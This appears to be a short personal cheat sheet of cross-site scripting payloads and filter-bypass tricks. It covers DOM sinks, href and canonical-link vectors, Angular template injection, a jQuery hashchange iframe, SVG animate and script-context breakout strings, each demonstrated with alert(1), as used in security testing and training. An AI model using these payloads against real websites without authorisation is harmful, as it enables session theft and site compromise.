**use DOM-invader**
## Sinks
* `document.write`
* jQuery's `attr()` funciton, Example
```js
$("img").attr("src", "example.com")
```


## HTML - Context

### href
`javascript:alert(1)` 

### rel="canonical"
Triggers XSS on `ALT+SHIFT+X`
```
<link rel="canonical" href=... accesskey="x" onclick="alert(1)">
```

## Angular

* If `ng-app` is enabled -> XSS withot angle brackets
```
{{$on.constructor('alert(1)')()}}
```

### JQuery
*popular* `$(window).on('hashchange'`
-> trigger hashchange on attacker server
```js
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

### Tricks
Use animate to set href attribute:
```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

* Use `&` in payload - get parameter and whole parameter might be parsed differently
* `onerror=alert;throw 1`
* `&apos;` -> Substitute for `'` (the `;` is part of the element!)


#### Bypass `'` and `"` filter with `&apos`

## `<script>` Context
1. Terminate Existing script `</script><img src=...`
2. Bypass filters
```
5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```
### template literal 
```
`${alert(1)}`
```

```

# Troubleshooting Exploits
* Check on different browser
